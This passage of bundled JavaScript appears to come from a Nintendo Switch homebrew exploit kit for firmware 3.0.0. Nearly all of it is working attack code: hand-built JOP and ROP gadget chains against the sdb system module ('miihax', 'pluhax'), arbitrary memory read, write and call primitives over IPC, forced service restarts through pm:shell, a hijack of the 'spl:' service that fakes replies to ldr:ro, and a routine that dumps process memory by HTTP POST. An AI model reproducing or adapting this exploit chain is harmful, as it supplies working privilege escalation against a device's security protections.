	var memstates = ['NONE', '(1)', '(2)', 'CODE-STATIC', 'CODE', 'HEAP', 'SHARED-MEM-BLOCK', 'MODULE-CODE-STATIC', 'MODULE-CODE', 'STACK-MIRROR', 'THREAD-LOCAL-STORAGE', 'MEMORY_MIRROR', '(15)', 'RESERVED'];
	this.svc(0x6, [meminfo, pageinfo, addr]);

	var ms = this.rw.read(utils.add2(meminfo, 0x10));
	ms =  utils.paddr(ms);
	/*if(!raw && ms[1] == 0 && ms[0] < memstates.length)
    ms = memstates[ms[0]];
    else if(!raw)
    ms = 'UNKNOWN'*/
	var mp = this.rw.read(utils.add2(meminfo, 0x18));
	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
		mp = memperms[mp[0]];

	var data = [this.rw.read(meminfo), this.rw.read(utils.add2(meminfo, 8)), ms, mp, this.rw.read(pageinfo)];

	return data;
};


sdbcore.prototype.svc = function(id, registers, dump_regs) {
	if (arguments.length == 2)
		dump_regs = false;
	if (!(id in this.svcs)) {
		utils.log('Error: sdb does not contain svc 0x'+id.toString(16));
		return null;
	}
	return this.slowCall(this.svcs[id], registers, [], dump_regs);
};

sdbcore.prototype.resetModule = function() {
	// wipe all miis
	this.handle = sc.ipcMsg(0).data(0xA523B78F).sendTo('mii:e').assertOk().movedHandles[0];
	utils.log("mii handle is 0x" + this.handle.toString(16));
	utils.log("wipe miis ...");
	Wipe(this.handle);

	var resetcount = 0;
	var sdbPid = getServicePid(this.handle);
	var tid = utils.parseAddr('0100000000000039');

	utils.log("reloading sdb, this might take a while ...");

	while(1)
	{
		sc.svcCloseHandle(this.handle);
		sc.killAutoHandle();

		// restart sdb
		sc.ipcMsg(1).data(sdbPid).sendTo('pm:shell').assertOk();
		sdbPid = this.sc.ipcMsg(0).datau64(0, tid, 3).sendTo('pm:shell').data[0];
		utils.log("new sdb pid: 0x" + sdbPid.toString(16));

		this.handle = sc.ipcMsg(0).data(0xA523B78F).sendTo('mii:e').assertOk().movedHandles[0];

		this.sdb_base = GetLoadBase(this.handle, this.authorid);
	//	utils.log("this.sdb_base at " + utils.paddr(this.sdb_base));

		if(checkMiiCode(this.sdb_base[0] >>> 24) && checkMiiCode((this.sdb_base[0] >>> 16) & 0xFF) && this.sdb_base[1] > 0)
		{
			utils.log("sdb pid is 0x" + sdbPid.toString(16) + " this.sdb_base at " + utils.paddr(this.sdb_base));
			utils.log("** good base ***");
			break;
		}
		resetcount++;
	}
};

function add64(buf, offs, data)
{
	buf[offs++] = data[0] & 0xFF;
	buf[offs++] = (data[0] >>> 8) & 0xFF;
	buf[offs++] = (data[0] >>> 16) & 0xFF;
	buf[offs++] = (data[0] >>> 24) & 0xFF;
	buf[offs++] = data[1] & 0xFF;
	buf[offs++] = (data[1] >>> 8) & 0xFF;
	buf[offs++] = (data[1] >>> 16) & 0xFF;
	buf[offs++] = (data[1] >>> 24) & 0xFF;
}

sdbcore.prototype.setupBuffers = function() {
	this.scratch = utils.add2(this.sdb_base, 0x14ED00);
	
	this.pdm_base = utils.add2(this.sdb_base, 0x150ec0);
	utils.log("this.pdm_base at " + utils.paddr(this.pdm_base));

	var returnAddr = utils.add2(this.sdb_base, 0x2fc58);

	// rewrite pl:u cmd1
	var writeAddr = utils.add2(this.sdb_base, 0x99A98);
	var writeValue = utils.add2(this.sdb_base, 0x017d80); // gadget 0

	var buf = new Uint8Array(0x700);

	/// JOP chains
	// notice how nicely are these values compacted

	// miihax arb.write
	add64(buf, 0x0000, utils.add2(this.pdm_base, 0x0020)); // A
	add64(buf, 0x0008, writeAddr);
	add64(buf, 0x0010, utils.add2(this.sdb_base, 0x2d170)); // *B
	add64(buf, 0x0018, utils.add2(this.sdb_base, 0x6740));
	add64(buf, 0x0020, utils.add2(this.pdm_base, 0x0010)); // *A; B
	add64(buf, 0x0028, utils.add2(this.sdb_base, 0x7160)); // *D
	add64(buf, 0x0030, utils.add2(this.sdb_base, 0x53430)); // *A + 0x10
	add64(buf, 0x0038, utils.add2(this.pdm_base, 0x0040)); // *A + 0x18; C
	add64(buf, 0x0040, utils.add2(this.pdm_base, 0x0028)); // *C; D
	add64(buf, 0x0048, utils.add2(this.pdm_base, 0x0060)); // *E; F
	add64(buf, 0x0050, utils.add2(this.sdb_base, 0x2f090)); // *D + 0x28
	add64(buf, 0x0058, utils.add2(this.pdm_base, 0x0048)); // *C + 0x18; E
	add64(buf, 0x0060, utils.add2(this.pdm_base, 0x0060)); // *F; G
	add64(buf, 0x0068, utils.add2(this.sdb_base, 0x7160)); // *G + 0x08
	add64(buf, 0x0070, utils.add2(this.sdb_base, 0x7160)); // *B + 0x60
	add64(buf, 0x0078, utils.add2(this.pdm_base, 0x0080)); // *F + 0x18; H
	add64(buf, 0x0080, utils.add2(this.pdm_base, 0x0098)); // *H; I
	add64(buf, 0x0088, utils.add2(this.sdb_base, 0x2d5f8)); // *F + 0x28
	add64(buf, 0x0090, utils.add2(this.sdb_base, 0x47cc8)); // *F + 0x30
	add64(buf, 0x0098, utils.add2(this.sdb_base, 0x7218)); // *G + 0x38
	add64(buf, 0x00a0, returnAddr); // *I + 0x08
	add64(buf, 0x00a8, writeValue); // *I + 0x10 
	// note: b0 - b8 used
	add64(buf, 0x00c0, utils.add2(this.sdb_base, 0x2d5f8)); // *I + 0x28
	add64(buf, 0x00c8, utils.add2(this.sdb_base, 0x4b46c)); // *I + 0x30
	// pluhax arb.read and arb.write; both share 'first stage'
	add64(buf, 0x00b0, utils.add2(this.pdm_base, 0x0c0)); // A
	add64(buf, 0x00b8, utils.add2(this.pdm_base, 0x0d8)); // B
	// note: c0 - c8 used
	add64(buf, 0x00d0, utils.add2(this.sdb_base, 0x0026cc)); // *A + 16; gatget 4
	add64(buf, 0x00d8, utils.add2(this.pdm_base, 0x110)); // *B; C
	add64(buf, 0x00e0, utils.add2(this.pdm_base, 0x148)); // *E; F
	add64(buf, 0x00e8, utils.add2(this.pdm_base, 0x120)); // *E + 8; G
	add64(buf, 0x00f0, utils.add2(this.sdb_base, 0x0033d0)); // *A + 48; gatget 3
	add64(buf, 0x00f8, utils.add2(this.sdb_base, 0x01349c)); // *B + 32; gatget 10
	add64(buf, 0x0100, utils.add2(this.pdm_base, 0x0e0)); // *D + 8; E
	add64(buf, 0x0108, utils.add2(this.sdb_base, 0x025d08)); // *B + 48; gatget 6
	add64(buf, 0x0110, utils.add2(this.sdb_base, 0x04de9c)); // *C; gatget 5
	add64(buf, 0x0118, utils.add2(this.sdb_base, 0x014134)); // *C + 8; gatget 7
	add64(buf, 0x0120, utils.add2(this.pdm_base, 0x158)); // *G; H
	add64(buf, 0x0128, utils.add2(this.sdb_base, 0x02d6c8)); // *C + 24; gatget 8
	add64(buf, 0x0130, utils.add2(this.pdm_base, 0x168)); // Z
	add64(buf, 0x0138, utils.add2(this.pdm_base, 0x0f8)); // *B + 96; D
	add64(buf, 0x0140, utils.add2(this.sdb_base, 0x00638c)); // *B + 104; gatget 11
	add64(buf, 0x0148, utils.add2(this.sdb_base, 0x04dbf8)); // *F; gatget 12
	add64(buf, 0x0150, utils.add2(this.sdb_base, 0x02de0c)); // *F + 8; gatget14w
	add64(buf, 0x0158, utils.add2(this.sdb_base, 0x020C84)); // *G; returnW; *V + 40; returnR
	add64(buf, 0x0160, utils.add2(this.sdb_base, 0x002850)); // *G + 8; gatget16w
	add64(buf, 0x0168, utils.add2(this.pdm_base, 0x170)); // *Z; Y
	add64(buf, 0x0170, utils.add2(this.pdm_base, 0x1a8)); // *X; W
	add64(buf, 0x0178, utils.add2(this.pdm_base, 0x180)); // *X + 8; U
	add64(buf, 0x0180, utils.add2(this.pdm_base, 0x1b8)); // *U; T
	add64(buf, 0x0188, utils.add2(this.sdb_base, 0x0071e0)); // *F + 64; gatget15w
	add64(buf, 0x0190, utils.add2(this.pdm_base, 0x130)); // *X + 32; V
	add64(buf, 0x0198, utils.add2(this.sdb_base, 0x04dbf8)); // *Y + 40; gatget 15r
	add64(buf, 0x01a0, utils.add2(this.sdb_base, 0x002850)); // *X + 48; gatget 16r
	add64(buf, 0x01a8, utils.add2(this.sdb_base, 0x02dd5c)); // *W; gatget 14r
	add64(buf, 0x01b0, utils.add2(this.pdm_base, 0x170)); // *Z + 72; X
	add64(buf, 0x01b8, utils.add2(this.sdb_base, 0x035180)); // *T; gatget 17r
	// pluhax leak SP
	add64(buf, 0x01c0, utils.add2(this.pdm_base, 0x1c8)); // *C; D
	add64(buf, 0x01c8, utils.add2(this.sdb_base, 0x035180)); // *D; gatget 10
	add64(buf, 0x01d0, utils.add2(this.sdb_base, 0x002850)); // *D + 8; gatget 9
	add64(buf, 0x01d8, utils.add2(this.sdb_base, 0x011b38)); // gatget 7
	add64(buf, 0x01e0, utils.add2(this.pdm_base, 0x0c0)); // shared with arb.*
	add64(buf, 0x01e8, utils.add2(this.pdm_base, 0x1f0)); // A
	add64(buf, 0x01f0, utils.add2(this.pdm_base, 0x228)); // *A; gatget 5 ptr
	add64(buf, 0x01f8, utils.add2(this.pdm_base, 0x1f8)); // *A + 8; B
	add64(buf, 0x0200, utils.add2(this.pdm_base, 0x1c0)); // *B + 8; C
	add64(buf, 0x0208, utils.add2(this.pdm_base, 0x218)); // *C + 72; E
	add64(buf, 0x0210, utils.add2(this.pdm_base, 0x130)); // *A + 32; return ptr; shared with arb.*
	add64(buf, 0x0218, utils.add2(this.pdm_base, 0x1d8)); // *E; gatget 7 ptr
	add64(buf, 0x0220, utils.add2(this.sdb_base, 0x02d8d4)); // *A + 48; gatget 6
	add64(buf, 0x0228, utils.add2(this.sdb_base, 0x04de98)); // gatget 5
	// almost filled
	add64(buf, 0x0290, utils.add2(this.sdb_base, 0x04a3a8)); // *D + 200; gatget 8

	//add64(buf, 0x02e0, 0); // *C + 288; leaked SP

	// pluhax arb.call
	add64(buf, 0x0230, utils.add2(this.pdm_base, 0x0c0)); // shared with arb.*
	add64(buf, 0x0238, utils.add2(this.pdm_base, 0x240)); // A
	add64(buf, 0x0240, utils.add2(this.pdm_base, 0x268)); // *A; gatget 5 ptr
	add64(buf, 0x0248, utils.add2(this.pdm_base, 0x258)); // *A + 8; B
	add64(buf, 0x0250, utils.add2(this.pdm_base, 0x260)); // *B - 8; C
	add64(buf, 0x0258, utils.add2(this.pdm_base, 0x260)); // pdmNext1 + 8; gatget 11 ptr ptr
	add64(buf, 0x0260, utils.add2(this.pdm_base, 0x1b8)); // gatget 11 ptr; shared with arb.*
	add64(buf, 0x0268, utils.add2(this.sdb_base, 0x014104)); // gatget 5
	add64(buf, 0x0270, utils.add2(this.pdm_base, 0x130)); // pdmNext1 + 32; return ptr; shared with arb.*
	add64(buf, 0x0278, utils.add2(this.sdb_base, 0x01349c)); // *C + 24; gatget 6
	add64(buf, 0x0280, utils.add2(this.sdb_base, 0x02850)); // pdmNext1 + 48; gatget 10

	//add64(buf, 0x02a0, utils.add2(this.sdb_base, 0x2fc68)); // *A + 96; callAddr
	add64(buf, 0x02a8, utils.add2(this.sdb_base, 0x002c0)); // *A + 104; gatget 7

	add64(buf, 0x02d0, utils.add2(this.sdb_base, 0x4de98)); // pdmNext0; gatget 9

	//add64(buf, 0x02e8, 0); // storeAddr; returned X0
	//add64(buf, 0x02f0, 0); // storeAddr+8; returned X1


	add64(buf, 0x0300, [0x11223344, 0]); // testing value to read out

	utils.log("writePdm ...");
	writePdm(buf); // seems like it works reliably only once

	key = c64to8([this.pdm_base, [0xde000080, 0]]);

	var payload = new Uint8Array(48);
	add64(payload, 24, this.sdb_base); // 32bit LSB is kinda limited, so is 32bit MSB

	AddOrReplace(this.handle, key, payload, this.authorid);

	utils.log("trigger ...");
	Move(this.handle, key, 100);

	utils.log("cleanup ...");
	sc.svcCloseHandle(this.handle);
	sc.killAutoHandle();

	// prepare
	utils.log("entering pluhax ...");

	// arb.read and arb.write
	this.ipcGat1 = utils.add2(this.sdb_base, 0x00f194);
	this.ipcGat2 = utils.add2(this.sdb_base, 0x03f8a8);
	this.ipcGat9 = utils.add2(this.sdb_base, 0x0304c0);
	this.ipcGat13r = utils.add2(this.sdb_base, 0x02d8d4);
	this.ipcGat13w = utils.add2(this.sdb_base, 0x029b50);
	this.pdmEntry = utils.add2(this.pdm_base, 0x00b0); // JOP chain; shared for arb.read and arb.write
	this.pdmNext = utils.add2(this.pdm_base, 0x0128); // second stage JOP chain for arb.read; offset 8 (=0x130)

	// sp leak
	this.pdmLeakE = utils.add2(this.pdm_base, 0x1e0);

	// arb.call
	this.pdmCallE = utils.add2(this.pdm_base, 0x230);

	// shared for all calls (or ignored in some)
	this.ipcData = new Uint32Array(24);
	this.ipcData[15] = this.ipcGat1[0];
	this.ipcData[16] = this.ipcGat1[1];
	this.ipcData[17] = this.ipcGat9[0];
	this.ipcData[18] = this.ipcGat9[1];
	this.ipcData[19] = this.ipcGat2[0];
	this.ipcData[20] = this.ipcGat2[1];

	// run
	utils.log("trigger ..."); // return address: 0x020C84

	// get SP
	this.sdbPluSP = this.getSP();
	utils.log("pluSP at " + utils.paddr(this.sdbPluSP));

	// arb.call - prepare stack (permanent; maybe check after some calls?)
	this.write8(utils.add2(this.pdm_base, 0x2e8), utils.add2(this.sdbPluSP, 200)); // storeAddr (pdmNext0+24)
	this.write8(utils.add2(this.sdb_base, 0x579a8), utils.add2(this.sdbPluSP, 216)); // ROP chain 0
	this.write8(utils.add2(this.sdb_base, 0x01d44), utils.add2(this.sdbPluSP, 248)); // ROP chain 1
	this.write8(utils.add2(this.sdb_base, 0x4e950), utils.add2(this.sdbPluSP, 296)); // ROP chain 2
	this.write8(utils.add2(this.sdb_base, 0x1a0b8), utils.add2(this.sdbPluSP, 488)); // ROP chain 3
	this.write8(utils.add2(this.sdb_base, 0x3ca1c), utils.add2(this.sdbPluSP, 776)); // gatget 8
	this.write8(utils.add2(this.pdm_base, 0x2d0), utils.add2(this.sdbPluSP, 456)); // pdmNext0
	this.write8(utils.add2(this.pdm_base, 0x250), utils.add2(this.sdbPluSP, 760)); // pdmNext1
};

sdbcore.prototype.getSP = function() {
	// there is an offset between returned value and actualy saved one
	// i do not know if it is possible to get random addres that will make this fail
	// if so, just use read4 on this.pdm_base + 0x2e0 and from result subtract 0x3A8 instead

	this.ipcData[5] = this.pdmLeakE[0];
	this.ipcData[6] = this.pdmLeakE[1];

	var sp = [0,0]
	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, this.ipcData);
	sp[0] = ipc.sendTo('pl:u').cmdId;
	sp[1] = this.read4(utils.add2(this.pdm_base, 0x2e0 + 4)); // 32bit MSB

	return utils.sub2(sp, 0x328);
}


sdbcore.prototype.initialize = function(sc) {
	if (this.initialized) {
		utils.log('Already initialized...returning.');
		return;
	}

	this.authorid = getMiiAuthorId();
	utils.log("Author ID: " + Array.apply([], this.authorid).join(","));

	this.resetModule();
	this.setupBuffers();

	// write / read test
	var testAddr = utils.add2(this.pdm_base, 0x300);

	// write value
	utils.log("... write");
	this.write8([0x29910BAF, 0x11223344], testAddr);
	// read back
	utils.log("... read");
	var retVal = this.read8(testAddr);
	utils.log("read value: " + utils.paddr(retVal));

	utils.log('... call');
	utils.log('call: ' + utils.paddr(this.slowCall(0x02868, [[0xF00D1234, 0x1122aabb]])));

	if (this.vers == '3.0.0') {
		utils.log('Setting up RO hax...');
		this.setup_ro_hax();
	}

	this.initialized = true;
};

sdbcore.prototype.get_offsets = function() {
	var offset_dic = {
		'3.0.0' : {
			'memcpy' : 0x3a5f8, 
			'svc_dic' : {
				0x2 : 0x2fbf8,
				0x3 : 0x2fc00,
				0x4 : 0x2fc08,
				0x5 : 0x2fc10,
				0x6 : 0x2fc18,
				0x7 : 0x2fc30,
				0x8 : 0x2fc3c,
				0x9 : 0x2fc50,
				0xA : 0x2fc58,
				0xB : 0x2fc60,
				0xC : 0x2fc68,
				0x10 : 0x2fc80,
				0x12 : 0x2fc88,
				0x13 : 0x2fc90,
				0x14 : 0x2fc98,
				0x16 : 0x2fca0,
				0x18 : 0x2fca8,
				0x19 : 0x2fcc0,
				0x1A : 0x2fcc8,
				0x1B : 0x2fcd0,
				0x1C : 0x2fcd8,
				0x1D : 0x2fce0, 
				0x1F : 0x2fce8,
				0x21 : 0x2fd00,
				0x22 : 0x2fd08,
				0x25 : 0x2fd10,
				0x26 : 0x2fd28,
				0x27 : 0x2fd30,
				0x28 : 0x2fd38,
				0x29 : 0x2fd40,
				0x2c : 0x2fd58, 
				0x2d : 0x2fd60, 
				0x40 : 0x2fd80,
				0x41 : 0x2fda0,
				0x43 : 0x2fdb8,
				0x44 : 0x2fdd0,
				0x50 : 0x2fd68
			}
		}
	};
	if (this.vers in offset_dic) {
		return offset_dic[this.vers];
	}
	return null;
};

sdbcore.prototype.memdump = function(start, totalSize, name) {
	var end = utils.add2(start, totalSize);
	if (arguments.length == 2) {
		name = 'memdumps_sdb/sdb - '+utils.paddr(start) + ' - ' + utils.paddr(end) + '.bin';
	}

	var buf = new Uint32Array(8 * 1024 * 1024 / 4);
	var addr = sc.read8(sc.getAddr(buf), 4);

	utils.log('Dumping memory to '+name+'!');
	for(var idx = 0; idx < totalSize; idx += 0x700000) {
		size = totalSize - idx;
		size = size > 0x700000 ? 0x700000 : size;
		this.sc.gc();
		var obj = new sdbown(buf);
		var base = this.leakPrev(8);
		var sdbbuf = utils.add2(base, 0x100000);

		this.slowCall(this.offsets['memcpy'], [sdbbuf, start, size]);
		obj.svc.leak();

		this.sc.memview(utils.add2(addr, 0x100000), size, function(ab) {
			var view = new Uint8Array(ab);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', name);
			xhr.send(view);
		});
	}
	this.sc.gc();
	utils.log('Dumped memory succesfully!');
};

sdbcore.prototype.slowCall = function(funcptr, args, fargs, dump_regs) {
	if(typeof(funcptr) == 'number') {
		funcptr = utils.add2(this.sdb_base, funcptr);
	}
	switch(arguments.length) {
	case 1:
		args = [];
	case 2:
		fargs = [];
	case 3:
		dump_regs = false;
	}

	for (var i = 0; i < args.length; i++) {
		if (typeof(args[i]) == 'number') {
			args[i] = [args[i], 0];
		}
	}

	var scratchOff = 0;

	// Write registers for native code.
	if(args.length > 0) {
		for(var i = 0; i < 8 && i < args.length; i++) {
			if(ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
				var size = args[i].byteLength;
				var saddr = utils.add2(this.scratch, scratchOff);
				this.memcpyFromBrowser(saddr, sc.getArrayBufferAddr(args[i]), size);
				this.write8(saddr, utils.add2(this.sdbPluSP, 128 + 8 * i));
				scratchOff += size;
				if(scratchOff & 0x7)
					scratchOff = (scratchOff & 0xFFFFFFF8) + 8;
			} else
				this.write8(args[i], utils.add2(this.sdbPluSP, 128 + 8 * i));
		}
	}

	this.write8(funcptr, utils.add2(this.pdm_base, 0x2a0));

	this.ipcData[5] = this.pdmCallE[0];
	this.ipcData[6] = this.pdmCallE[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, this.ipcData);
	var lo = ipc.sendTo('pl:u').cmdId;

	scratchOff = 0;
	if(args.length > 0) {
		for(var i = 0; i < 30 && i < args.length; i++) {
			if(ArrayBuffer.isView(args[i]) || args[i] instanceof ArrayBuffer) {
				var size = args[i].byteLength;
				var saddr = utils.add2(this.scratch, scratchOff);
				this.memcpyToBrowser(sc.getArrayBufferAddr(args[i]), saddr, size);
				scratchOff += size;
				if(scratchOff & 0x7)
					scratchOff = (scratchOff & 0xFFFFFFF8) + 8;
			}
		}
	}
	return [lo, this.read4(utils.add2(this.pdm_base, 0x2e8 + 4))];
};

sdbcore.prototype.read8 = function(addr) {
	return [this.read4(addr), this.read4(utils.add2(addr, 4))];
};

sdbcore.prototype.read4 = function(addr) {
	var id2 = new Uint32Array(24);
	id2[3] = this.pdmNext[0];
	id2[4] = this.pdmNext[1];
	id2[5] = this.pdmEntry[0];
	id2[6] = this.pdmEntry[1];
	id2[9] = addr[0];
	id2[10] = addr[1];
	id2[13] = this.ipcGat13r[0];
	id2[14] = this.ipcGat13r[1];
	id2[15] = this.ipcGat1[0];
	id2[16] = this.ipcGat1[1];
	id2[17] = this.ipcGat9[0];
	id2[18] = this.ipcGat9[1];
	id2[19] = this.ipcGat2[0];
	id2[20] = this.ipcGat2[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, id2);
	return ipc.sendTo('pl:u').cmdId;
};

sdbcore.prototype.read2 = function(addr) {
	throw 'sdbcore.read2 not implemented';
};

sdbcore.prototype.read1 = function(addr) {
	throw 'sdbcore.read1 not implemented';
};

sdbcore.prototype.write8 = function(val, addr) {
	var id = new Uint32Array(24);
	id[3] = addr[0];
	id[4] = addr[1];
	id[5] = this.pdmEntry[0];
	id[6] = this.pdmEntry[1];
	id[9] = val[0];
	id[10] = val[1];
	id[13] = this.ipcGat13w[0];
	id[14] = this.ipcGat13w[1];
	id[15] = this.ipcGat1[0];
	id[16] = this.ipcGat1[1];
	id[17] = this.ipcGat9[0];
	id[18] = this.ipcGat9[1];
	id[19] = this.ipcGat2[0];
	id[20] = this.ipcGat2[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, id);
	ipc.sendTo('pl:u');
};

sdbcore.prototype.write82 = function(val, addr) {
	var id = new Uint32Array(24);
	id[3] = addr[0];
	id[4] = addr[1];
	id[5] = this.pdmEntry[0];
	id[6] = this.pdmEntry[1];
	id[9] = val[0];
	id[10] = val[1];
	id[13] = this.ipcGat13w[0];
	id[14] = this.ipcGat13w[1];
	id[15] = this.ipcGat1[0];
	id[16] = this.ipcGat1[1];
	id[17] = this.ipcGat9[0];
	id[18] = this.ipcGat9[1];
	id[19] = this.ipcGat2[0];
	id[20] = this.ipcGat2[1];

	var ipc = sc.ipcMsg(1);
	ipc.datau32.apply(ipc, id);
	ipc.sendTo('pl:u');
};

sdbcore.prototype.write4 = function(val, addr) {
	throw 'sdbcore.write4 not implemented';
};

sdbcore.prototype.write2 = function(val, addr) {
	throw 'sdbcore.write2 not implemented';
};

sdbcore.prototype.write1 = function(val, addr) {
	throw 'sdbcore.write1 not implemented';
};

sdbcore.prototype.memcpyFromBrowser = function(dst, src, size) {
	for(var i = 0; i < size; i += 8) {
		var s = utils.add2(src, i);
		//utils.log('[Bro] Reading ' + i);
		var v = [src[i >>> 2], src[(i >>> 2) + 1]];
		//utils.log('[SDB] Writing ' + utils.paddr(v) + ' to ' + i);
		this.write82(v, utils.add2(dst, i));
	}
};

sdbcore.prototype.memcpyToBrowser = function(dst, src, size) {
	var sub = [];
	for(var i = 0; i < size; i += 4) {
		//utils.log('[SDB] Reading ' + i);
		var v = this.read4(utils.add2(src, i));
		//utils.log('[Bro] Writing ' + v.toString(16) + ' to ' + i);
		dst[i >> 2] = v;
	}
};

sdbcore.prototype.malloc = function(size) {
	//return this.slowCall(this.offsets['malloc'], [0, size]);
};

sdbcore.prototype.free = function(addr) {
	//this.slowCall(this.offsets['free'], [0, addr]);
};

sdbcore.prototype.setup_ro_hax = function() {
	var sdbIpcBuf = utils.add2(this.sdb_base, 0x150000);
	
	var sdb = this;
	var sc = this.sc;

	function waitHandles(handles) {
		for(var i = 0; i < handles.length; ++i)
			sdb.write8([handles[i], 0], utils.add2(sdbIpcBuf, 4 + i * 4));
		var ret = sdb.svc(0x18, [sdbIpcBuf, utils.add2(sdbIpcBuf, 4), handles.length, 0])[0];
		var hndI = sdb.read4(sdbIpcBuf);
		return [ret, hndI];
	}

	function acceptSession(handle) {
		sdb.svc(0x41, [sdbIpcBuf, handle]);
		return sdb.read4(sdbIpcBuf);
	}

	function readIncoming(handle) {
		utils.log('Writing handle');
		sdb.write8([handle, 0], sdb.scratch);
		utils.log('replyandreceive');
		var ret = sdb.svc(0x44, [sdb.scratch, sdbIpcBuf, 0x1000, sdb.scratch, 1, [0, 0], [0xffffffff, 0xffffffff]])[0];
		utils.log('Copying data');
		if(ret == 0xf601)
			return null;
		var data = new Uint32Array(0x100);
		sdb.memcpyToBrowser(data, sdbIpcBuf, 7 << 2);
		utils.log('Done?');
		return data;
	}

	function respond(handle, data) {
		utils.log('Attempting to respond');
		sdb.memcpyFromBrowser(sdbIpcBuf, data, data.length << 2);
		utils.log('replyandreceive');
		utils.log(utils.paddr(sdb.svc(0x44, [sdb.scratch, sdbIpcBuf, 0x1000, sdb.scratch, 0, handle, [0, 0]])));
		utils.log('Done?');
	}

	this.sc.unregisterService('spl:');

	utils.log('Opening SM handle');
	utils.log(utils.paddr(sdb.svc(0x1F, [sdbIpcBuf, utils.add2(sdb.sdb_base, 0x71807)])));
	var sdbSmHandle = sdb.read4(sdbIpcBuf);
	utils.log('SM handle: ' + sdbSmHandle.toString(16));

	var data = new Uint32Array([0x4, 0xc, 0, 0, 0x49434653, 0, 2, 0, 0x3a6c7073, 0, 200, 0x20]);
	sdb.memcpyFromBrowser(sdbIpcBuf, data, data.length << 2);
	utils.log(utils.paddr(sdb.svc(0x22, [sdbIpcBuf, 0x1000, sdbSmHandle])));
	var output = new Uint32Array(0x100 >> 2);
	sdb.memcpyToBrowser(output, sdbIpcBuf, 4 << 2);
	
	for(var i = 0; i < 4; ++i)
		utils.log(output[i].toString(16));

	var portHandle = output[3];
	utils.log('Port handle: ' + portHandle.toString(16));
	var handles = [portHandle];
	
	waitHandles(handles);

	var lgetServicePid = function(service) {
		this.sc.killAutoHandle();
		var res = this.sc.ipcMsg(2).setType(3).datau64(0).sendTo(service).show();
		this.sc.svcCloseHandle(res.movedHandles[0]);
		return res.pid[0];
	};

	var service = 'ldr:ro';
	var pid = lgetServicePid(service);
	utils.log(service + ' is PID 0x'+pid.toString(16));

	this.sc.ipcMsg(1).data(pid).sendTo('pm:shell').show();

	var tid = utils.parseAddr('0100000000000037');

	var newPid = this.sc.ipcMsg(0).datau64(0, tid, 3).sendTo('pm:shell').show().data[1][0];

	var interval = setInterval(function() {
		var temp = waitHandles(handles);
		switch(temp[0]) {
		case 0:
			utils.log('Handle ' + temp[1] + ' ready');
			var handle = handles[temp[1]];
			if(handle == portHandle) {
				var pipe = acceptSession(portHandle);
				utils.log('Accepted new pipe ' + pipe.toString(16));
				handles.push(pipe);
			} else {
				utils.log('Got incoming message on ' + handle.toString(16));
				var data = readIncoming(handle);
				if(data == null) {
					utils.log('Pipe closed.  Removing.');
					sdb.svc(0x16, [handle]);
					handles.splice(handles.indexOf(handle), 1);
					clearInterval(interval); // We should be done now!
					if (sdb.onready != null)
						sdb.onready();
					break;
				}

				if(data[6] == 11) { // GetDevUnitFlag
					respond(handle, new Uint32Array([0, 0xa, 0, 0, 0x4f434653, 0, 0, 0, 0, 0]));
				} else if(data[6] == 0) {
					respond(handle, new Uint32Array([0, 0xa, 0, 0, 0x4f434653, 0, 0, 0, 1, 0]));
				} else {
					clearInterval(interval);
				}
			}
			break;
		case 0xea01:
			break;
		default:
			utils.log('Unknown ret for wait: ' + temp[0].toString(16));
			break;
		}
	}, 100);
};

module.exports = sdbcore;

},{"./sploitMixin":12,"./svc":14,"./utils":15}],12:[function(require,module,exports){
var utils = require('./utils');

var sploitMixin = {};

sploitMixin.sploitMixinInit = function () {
	this.ipcHandles = {};
};

sploitMixin.withHandle = function (handle, cb) {
	try {
		return cb(handle);
	} finally {
		this.svcCloseHandle(handle);
	}
};

sploitMixin.findUnmappedRegion = function (targetSize) {
	targetSize = utils.pad64(targetSize);

	// skip the first block so nobody tries to map at 0
	var addr = [0, 0];
	var [base, size, state, perm] = this.svcQueryMem(addr, true).assertOk();
	do {
		addr = utils.add2(addr, size);
		[base, size, state, perm] = this.svcQueryMem(addr, true).assertOk();
		if (base[0] !== addr[0] || base[1] !== addr[1]) {
			throw new Error('queryMem base mismatch?');
		}
	} while (size[1] < targetSize[1] || (size[1] === targetSize[1] && size[0] < targetSize[0]) || perm !== 0 || state !== 0);
	return addr;
};

module.exports = sploitMixin;

},{"./utils":15}],13:[function(require,module,exports){
/* eslint camelcase: "off" */
/* eslint no-redeclare: "off" */
/* eslint no-unmodified-loop-condition: "off" */
/* eslint no-fallthrough: "off" */
/* global XMLHttpRequest */
var utils = require('./utils');

var SDBCore = require('./sdbcore');
var AsyncCaller = require('./AsyncCaller');
var svcMixin = require('./svc');
var sploitMixin = require('./sploitMixin');

var IFile = require('./fs/IFile');
var IFileSystem = require('./fs/IFileSystem');
var IDirectory = require('./fs/IDirectory');

var config = require('../config');

/**
 A value that represents a 64-bit Integer<br>
 This is an array of exactly 2 values, as described below.

 @typedef {Array.<number>} u64
 @property {number} 0 - Low value of u64
 @property {number} 1 - High value of u64
 @example
 [ 0x00000000, 0xffff0000 ]
 */

/**
 Represents an instance of SploitCore
 @constructor
 @param {object} exploitMe - Reference to object used for leaking data
 @property {u64} base - Base address
 @property {boolean} isBrowser - Returns true
 @property {string} name - Returns "browser"
 */
var SploitCore = function (exploitMe) {
	this.gc();

	this.va = exploitMe.va;
	this.vb = exploitMe.vb;
	this.leakee = exploitMe.leakee;
	this.leakaddr = exploitMe.leakaddr;

	this.allocated = {};

	this.func = document.getElementById;
	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9

	if (!SploitCore.prototype.importedMixins) {
		Object.keys(svcMixin).forEach((k) => {
			SploitCore.prototype[k] = svcMixin[k];
		});

		Object.keys(sploitMixin).forEach((k) => {
			SploitCore.prototype[k] = sploitMixin[k];
		});

		SploitCore.prototype.importedMixins = true;
	}

	this.sc = this;

	this.base = this.getBase();

	this.mainaddr = this.walkList();
	utils.dlog('Main address ' + utils.paddr(this.mainaddr));

	// This isn't exactly right, but really shouldn't matter.  As long as it's <= the real size, we won't crash.
	this.mainTextSize = 0x5B2000;
	this.wkcTextSize = 0xF37000;

